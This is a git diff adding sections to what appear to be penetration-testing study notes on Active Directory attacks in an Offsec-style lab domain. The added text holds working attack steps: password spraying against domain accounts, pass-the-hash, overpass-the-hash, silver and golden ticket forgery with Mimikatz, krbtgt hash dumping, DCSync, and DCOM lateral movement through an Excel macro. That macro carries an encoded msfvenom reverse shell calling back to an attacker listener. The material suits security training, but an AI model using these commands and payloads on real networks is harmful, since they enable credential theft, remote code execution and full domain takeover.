@@ -288,7 +288,7 @@ We can see that Adam is the only member.
 
 We want to find currently logged in users now, since we can find passwords or other loot in the cache and steal them.
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 If we manage to compromise a Domain Admin, we have essentially compromised the whole domain. However, we can also compromise other accounts or machines. Note in the picture above that we can compromise Bob, then Alice, then Jeff.&#x20;
 
@@ -366,7 +366,7 @@ One of the attributes, samaccountname is set to iis\_service, which tells us the
 
 NTLM Authentication is used when a client authenticates to a server by IP instead of hostname. The NTLM authentication protocol has 7 steps:
 
-<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 1. The client computer calculates a hash, referred to as the NTLM hash, from the user's password.
 2. The client sends the username(stored in plaintext) to the server.
@@ -399,7 +399,7 @@ While NTLM works by challenge and response, Kerberos uses a ticket system. At hi
 
 Password hashes must be stored somewhere to validate TGT requests. In current versions, these are stored in LSASS memory space. &#x20;
 
-While data structures used to store these hashes are not publicly documented and encrypted, we can use Mimikatz to extract hashes from Windows 10.
+While data structures used to store these hashes are not publicly documented and encrypted, we can use Mimikatz to extract hashes from Windows 10. This must be run as a user with system privileges.
 
 ```
 C:\Tools\active_directory> mimikatz.exe
@@ -461,3 +461,288 @@ kirbi2john ticket.kirbi > ticket.john
 john --wordlist=passwords.txt --format=krb5tgs ticket.john
 ```
 
+### Low and Slow Password Guessing
+
+We can see that service accounts can be used to mount attack vectors from the Kerberos protocol, but AD can also provide information that can be used to guess passwords. When performing a brute force or wordlist attack, account lockouts are an inevitable issue that may alert system administrators.&#x20;
+
+We will use LDAP and ADSI instead to perform a "low and slow" password attack against AD users without triggering an account lockout.
+
+First, we need to see the account lockout threshold with the net.exe command to see how many failed logins we can attempt.
+
+```
+PS C:\Users\Offsec.corp> net accounts
+Force user logoff how long after time expires?:       Never
+Minimum password age (days):                          0
+Maximum password age (days):                          42
+Minimum password length:                              0
+Length of password history maintained:                None
+Lockout threshold:                                    5
+Lockout duration (minutes):                           30
+Lockout observation window (minutes):                 30
+Computer role:                                        WORKSTATION
+The command completed successfully.
+```
+
+Note that after 5 failed logins we will be locked out, and we have 30 minutes between failed logins.
+
+Therefore, we can attempt 4\*864/30= 192 logins within a 24 hour period.&#x20;
+
+We can compile a short list of common passwords and use it agianst a massive amount of users, which could reveal weak links in the organization.
+
+```
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+  
+$PDC = ($domainObj.PdcRoleOwner).Name
+
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+
+$SearchString += $DistinguishedName
+
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")
+```
+
+This is brutally narrow, though, so we can use Spray-Passwords to check all the users.&#x20;
+
+```
+.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
+```
+
+## Active Directory Lateral movement
+
+### Pass the Hash
+
+Passing the Hash allows an attacker to authenticate with an NTLM hash. This does require local administrative rights on the target machine.
+
+```
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+```
+
+Easy as that. Note that the value after Adminstrator% is the hash retrieved by mimikatz. The first value, aad3b435b51404eeaad3b435b51404ee, is a placeholder hash - we should only be concerned with the part after the colon.
+
+### Overpass the Hash
+
+Overpass the hash lets us "over" abuse a NTLM user hash to gain access to a full Kerberos Ticket Granting Ticket, which lets us access other machines or services as that user.
+
+An overpass the hash technique's main goal is to convert an NTLM hash into a kerberos ticket and avoid authentication. One way is using Mimikatz.
+
+```
+sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe
+```
+
+That will launch a PowerShell instance, and we can check if we are able to generate TGTs.
+
+```
+PS C:\Windows\system32> net use \\dc01
+The command completed successfully.
+
+PS C:\Windows\system32> klist
+
+Current LogonId is 0:0x1583ae
+
+Cached Tickets: (3)
+...
+```
+
+This indicates that the net use command was successful. Now, we changed the NTLM hash to a TGT, and thus we can use PsExec to launch cmd.exe remotely on the \dc01 machine as Jeff\_Admin.
+
+```
+.\PsExec.exe \\dc01 cmd.exe
+```
+
+### Pass the Ticket
+
+In the previous section, we used the overpass the hash technique to acquire a Kerberos TGT. However, we can only use the TGT on the machine it was created for, but a TGS can offer more flexibility.
+
+The **Pass the Ticket** attack uses the TGS, which can be exported and injected anywhere in the network to authenticate to a specific service.&#x20;
+
+Note that this requires local administrative rights on the target machine, just like Pass the Hash.
+
+Recall that the application on the server executing in the context of the service account checks the user's permissions from the group memberships in the service tickets. However, the user and group permissions are not verified.&#x20;
+
+If we authenticate against an IIS server that is executing in the context of the service account iis\_service, the IIS application will determine which permissions we have on the IIS server based on the group memberships.
+
+However, with the service account password or it's hash, we can make a bogus service ticket to access it's resource with any permissions we want. This is referred to as a **silver ticket**.
+
+Mimikatz can craft a silver ticket and inject it into memory through the **kerberos::golden** command.&#x20;
+
+To create a ticket, we need the security identifier or SID of the domain. It has the following structure:
+
+```
+S-R-I-S
+```
+
+The SID is composed with the letter "S" followed by a revision level(often 1), identifier-authority value(often 5 in AD) and one or more subauthority values.
+
+```
+S-1-5-21-2536614405-3629634762-1218571035-1116
+```
+
+We can easily obtain the SID of our current user and extract the domain SID part from it.
+
+```
+C:\Windows\system32>whoami /user
+
+USER INFORMATION
+----------------
+
+User Name   SID
+=========== ==============================================
+corp\offsec S-1-5-21-4038953314-3014849035-1274281563-1103
+```
+
+The string "S-1-5-21-4038953314-3014849035-1274281563" will be the domain SID. Note that I omitted 1103 as that is the specific object identifier.
+
+```
+kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:2892d26cdf84d7a70e2eb3b9f05c425e /ptt
+```
+
+Now we can interact with the service and gain access to any information based on the group memberships we put in the silver ticket.
+
+### Distributed Component Object Model
+
+The Microsoft Component Object Model is a system for creating software components that interact with each other.&#x20;
+
+DCOM allows lateral movement through use of Outlook and PowerPoint. This is best against workstations. We will use the Excel.Application DCOM object.
+
+To start, we must first discover the available methods for this DCOM object.&#x20;
+
+```
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.193.10"))
+
+$com | Get-Member
+```
+
+Then, we will open an Excel document and make a macro called mymacro.
+
+```
+Sub mymacro()
+    Shell ("notepad.exe")
+End Sub
+```
+
+We can now use the Copy method and send it to the SMB file share as well as execute it.
+
+```
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+
+$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+
+$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
+
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+
+$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+
+$temp = [system.io.directory]::createDirectory($Path)
+
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+
+$com.Run("mymacro")
+```
+
+This will open the notepad application. However, we can take this further with a reverse shell.
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.193.10 LPORT=4444 -f hta-psh -o evil.hta
+```
+
+We will need to convert this into smaller chunks with python and update the macro.
+
+```
+str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
+
+n = 50
+
+for i in range(0, len(str), n):
+	print "Str = Str + " + '"' + str[i:i+n] + '"'
+```
+
+```
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
+    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
+    ...
+    Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
+    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
+    Shell (Str)
+End Sub
+```
+
+Now if we run the ps1 file from before and set up a netcat listener we should be able to accept the shell.
+
+## Active Directory Persistence
+
+### Golden Tickets
+
+Recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This is the password hash of a domain user account called **krbtgt**.
+
+If we can get the krbtgt hash, we can create our own self made TGTs, known as **golden tickets**.&#x20;
+
+We can try to laterally move from the Windows 10 workstation to the domain controller with psexec. However, this will not work, as we do not have proper permissions.
+
+```
+psexec.exe \\dc01 cmd.exe
+```
+
+Instead, we can extract the password hash of the krbtgt account with mimikatz.&#x20;
+
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /patch
+Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : e2b475c11da2a0748290d87aa966c327
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : 75b60230a2394a812000dbfad8415965
+...
+```
+
+Now, we can forge the golden ticket.
+
+```
+kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+```
+
+Note the SID was obtained with the whoami /user command.
+
+Now, we can attempt lateral movement with PsExec.
+
+```
+mimikatz # misc::cmd
+C:\Users\offsec.corp> psexec.exe \\dc01 cmd.exe
+
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+C:\Windows\system32>
+```
+
+Note that if we tried to connect using PsExec to the IP address instead of the hostname, we would force usage of NTLM authentication and access would be blocked.
+
+### Domain Controller Synchronization
+
+Another way to achieve persistence is by stealing the password hashes of all admins in the domain.&#x20;
+
+```
+mimikatz # lsadump::dcsync /user:Administrator
+```
